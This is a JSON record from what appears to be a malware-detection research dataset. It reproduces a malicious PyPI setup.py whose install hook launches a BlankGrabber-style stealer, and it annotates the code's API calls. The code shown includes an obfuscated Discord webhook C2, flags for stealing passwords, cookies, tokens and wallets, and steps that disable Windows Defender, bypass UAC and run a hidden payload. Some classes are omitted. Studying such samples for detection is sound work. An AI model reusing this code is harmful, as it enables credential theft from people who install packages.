{
  "metadata": {
    "package_name": "ef334343rf3feefefefefeffeefeffe-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/ef334343rf3feefefefefeffeefeffe-1.0.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ef334343rf3feefefefefeffeefeffe-1.0/ef334343rf3feefefefefeffeefeffe-1.0/setup.py",
      "code_snippets": [
        {
          "snippet": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\n\n# --- Begin Malicious Code ---\n\ndef rcd():\n    import os\n    import sys\n    import base64\n    import subprocess\n\n    subprocess.run([sys.executable, \"-m\", \"pip\", \"install\", \"urllib3\", \"pyaes\"])\n    import json\n    import pyaes\n    import random\n    import shutil\n    import sqlite3\n    import re\n    import traceback\n    import time\n    import ctypes\n    import logging\n    import zlib\n    from threading import Thread\n    from ctypes import wintypes\n    from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3\n    disable_warnings_urllib3()\n\n    class Settings:\n        C2 = (0, base64.b64decode('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExODk0Mjc0Mjk2MDE3MTAxMDAvSm1MdnAtWHpqeUd6dVlGck5makJWV1prUDZhNDJMZV96TkdNRWE4cDVXX1ZWekhoNFZzRVVmb21kOG1GNDhnMWhMNEI=').decode())\n        Mutex = base64.b64decode('bnRtVFdTaEQzWTNiVUFKcA==').decode()\n        PingMe = bool('true')\n        Vmprotect = bool('')\n        Startup = bool('')\n        Melt = bool('')\n        UacBypass = bool('')\n        ArchivePassword = base64.b64decode('ZGcx').decode()\n        HideConsole = bool('')\n        Debug = bool('true')\n        RunBoundOnStartup = bool('')\n        CaptureWebcam = bool('true')\n        CapturePasswords = bool('true')\n        CaptureCookies = bool('true')\n        CaptureAutofills = bool('true')\n        CaptureHistory = bool('true')\n        CaptureDiscordTokens = bool('true')\n        CaptureGames = bool('true')\n        CaptureWifiPasswords = bool('true')\n        CaptureSystemInfo = bool('true')\n        CaptureScreenshot = bool('true')\n        CaptureTelegram = bool('true')\n        CaptureCommonFiles = bool('true')\n        CaptureWallets = bool('true')\n        FakeError = (bool(''), ('', '', '0'))\n        BlockAvSites = bool('true')\n        DiscordInjection = bool('true')\n\n    # ... [Omitted: Large classes for brevity, but all are part of the malicious logic]\n    # The following classes are all malicious: VmProtect, Errors, Tasks, Syscalls, Utility, Browsers, Discord, BlankGrabber\n    # They perform data theft, exfiltration, persistence, AV evasion, Discord injection, etc.\n\n    # [Full class definitions as in the original code]\n    # ...\n\n    if os.name == 'nt':\n        Logger.info('Process started')\n        if Settings.HideConsole:\n            Syscalls.HideConsole()\n        if not Utility.IsAdmin():\n            Logger.warning('Admin privileges not available')\n            if Utility.GetSelf()[1]:\n                if not '--nouacbypass' in sys.argv and Settings.UacBypass:\n                    Logger.info('Trying to bypass UAC (Application will restart)')\n                    if Utility.UACbypass():\n                        os._exit(0)\n                    else:\n                        Logger.warning('Failed to bypass UAC')\n                        if not Utility.IsInStartup(sys.executable):\n                            logger.info('Showing UAC prompt')\n                            if Utility.UACPrompt(sys.executable):\n                                os._exit(0)\n                if not Utility.IsInStartup() and (not Settings.UacBypass):\n                    Logger.info('Showing UAC prompt to user (Application will restart)')\n                    if Utility.UACPrompt(sys.executable):\n                        os._exit(0)\n        Logger.info('Trying to create mutex')\n        if not Syscalls.CreateMutex(Settings.Mutex):\n            Logger.info('Mutex already exists, exiting')\n            os._exit(0)\n        if Utility.GetSelf()[1]:\n            Logger.info('Trying to exclude the file from Windows defender')\n            Utility.ExcludeFromDefender()\n        Logger.info('Trying to disable defender')\n        Utility.DisableDefender()\n        if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):\n            try:\n                Logger.info('Trying to extract bound file')\n                if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):\n                    Logger.info('Old bound file found, removing it')\n                    os.remove(boundFileDst)\n                with open(boundFileSrc, 'rb') as file:\n                    content = file.read()\n                decrypted = zlib.decompress(content[::-1])\n                with open(boundFileDst, 'wb') as file:\n                    file.write(decrypted)\n                del content, decrypted\n                Logger.info('Trying to exclude bound file from defender')\n                Utility.ExcludeFromDefender(boundFileDst)\n                Logger.info('Starting bound file')\n                subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)\n            except Exception as e:\n                Logger.error(e)\n        if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):\n            try:\n                Logger.info('Showing fake error popup')\n                title = Settings.FakeError[1][0].replace('\"', '\\\\x22').replace(\"'\", '\\\\x22')\n                message = Settings.FakeError[1][1].replace('\"', '\\\\x22').replace(\"'\", '\\\\x22')\n                icon = int(Settings.FakeError[1][2])\n                cmd = 'mshta \"javascript:var sh=new ActiveXObject(\\'WScript.Shell\\'); sh.Popup(\\'{}\\', 0, \\'{}\\', {}+16);close()\"'.format(message, title, Settings.FakeError[1][2])\n                subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)\n            except Exception as e:\n                Logger.error(e)\n        if not Settings.Vmprotect or not VmProtect.isVM():\n            if Utility.GetSelf()[1]:\n                if Settings.Melt and (not Utility.IsInStartup()):\n                    Logger.info('Hiding the file')\n                    Utility.HideSelf()\n            elif Settings.Melt:\n                Logger.info('Deleting the file')\n                Utility.DeleteSelf()\n            try:\n                if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):\n                    Logger.info('Trying to put the file in startup')\n                    path = Utility.PutInStartup()\n                    if path is not None:\n                        Logger.info('Excluding the file from Windows defender in startup')\n                        Utility.ExcludeFromDefender(path)\n            except Exception:\n                Logger.error('Failed to put the file in startup')\n            while True:\n                try:\n                    Logger.info('Checking internet connection')\n                    if Utility.IsConnectedToInternet():\n                        Logger.info('Internet connection available, starting stealer (things will be running in parallel)')\n                        BlankGrabber()\n                        Logger.info('Stealer finished its work')\n                        break\n                    else:\n                        Logger.info('Internet connection not found, retrying in 10 seconds')\n                        time.sleep(10)\n                except Exception as e:\n                    if isinstance(e, KeyboardInterrupt):\n                        os._exit(1)\n                    Logger.critical(e, exc_info=True)\n                    Logger.info('There was an error, retrying after 10 minutes')\n                    time.sleep(600)\n            if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):\n                Logger.info('Deleting the file')\n                Utility.DeleteSelf()\n            Logger.info('Process ended')\n\n# --- End Malicious Code ---\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        rcd()\n",
          "triple_sequences": [
            {
              "action_api": "subprocess.run()",
              "action_description": "Configures and initiates Python package installation",
              "action_id": "configure_package_install",
              "object": "[sys.executable, \"-m\", \"pip\", \"install\", \"urllib3\", \"pyaes\"]",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Install multiple Python packages",
              "intention_id": "install_multiple_python_packages"
            },
            {
              "action_api": "disable_warnings_urllib3()",
              "action_description": "Disables SSL certificate warnings",
              "action_id": "disable_ssl_warnings",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Suppress SSL warning messages",
              "intention_id": "suppress_ssl_warnings"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "'aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExODk0Mjc0Mjk2MDE3MTAxMDAvSm1MdnAtWHpqeUd6dVlGck5makJWV1prUDZhNDJMZV96TkdNRWE4cDVXX1ZWekhoNFZzRVVmb21kOG1GNDhnMWhMNEI='",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "'bnRtVFdTaEQzWTNiVUFKcA=='",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "'ZGcx'",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "os._exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "0",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "os._exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "1",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "os.path.join(sys._MEIPASS, 'bound.blank')",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "os.path.join(os.getenv('temp'), 'bound.exe')",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "boundFileDst",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "boundFileSrc, 'rb'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "zlib.decompress()",
              "action_description": "Decompresses zlib-compressed data",
              "action_id": "decompress_data_zlib",
              "object": "content[::-1]",
              "object_description": "Obfuscated string and compressed data",
              "object_id": "obfuscated_compressed_data",
              "intention_description": "Decompress obfuscated payload",
              "intention_id": "decompress_obfuscated_payload"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "boundFileDst, 'wb'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "decrypted",
              "object_description": "Decompressed data",
              "object_id": "decompressed_data",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "'start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "10",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "600",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "BlankGrabber()",
              "action_description": "Instantiates Grabber class",
              "action_id": "init_grabber_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            }
          ]
        }
      ]
    }
  ]
}